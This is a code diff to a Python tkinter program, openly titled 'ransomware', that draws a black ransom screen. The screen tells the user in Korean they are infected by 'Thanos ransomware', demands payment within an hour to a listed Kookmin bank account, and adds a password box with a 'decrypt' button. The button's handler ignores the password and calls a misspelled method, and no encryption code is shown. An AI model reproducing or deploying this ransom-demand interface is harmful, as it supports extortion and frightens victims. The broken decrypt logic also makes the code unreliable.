@@ -1,12 +1,22 @@
 import tkinter
 import time
 from logging import root
+from tkinter import messagebox, ttk
+
+
 
 window=tkinter.Tk()
 window.title("ransomware")
-window.geometry("700x600+300+300")
+window.geometry("700x900+300+300")
 window.resizable(False, False)
 window.configure(background="black")
+
+#버튼클릭시 복호화될수 있게
+def dec():
+    pw=str(password.get())
+
+    window.destory()
+
 
 label1=tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.",fg="red",bg="black", font='Helvetica 14 bold')
 label1.pack()
@@ -14,6 +24,14 @@ label2=tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 
 label2.pack()
 label3=tkinter.Label(window, text="국민 786102-00-040854", fg="red",bg="black", font='Helvetica 18 bold')
 label3.pack()
+
+label4=tkinter.Label(window, text="password:",fg="red",bg="black", font='Helvetica 14 bold')
+label4.pack()
+password= tkinter.Entry(window)
+password.pack()
+
+pwbutton= tkinter.Button(window, text="복호화",command=dec)
+pwbutton.pack()
 
 imagelist = ["1.png","2.png","3.png","8.png","9.png"]
 # extract width and height info
@@ -34,6 +52,5 @@ for k in range(0, 1000):
         canvas.create_image(width/2.0, height/2.0, image=gif)
         canvas.update()
         time.sleep(0.5)
-
 
 window.mainloop()
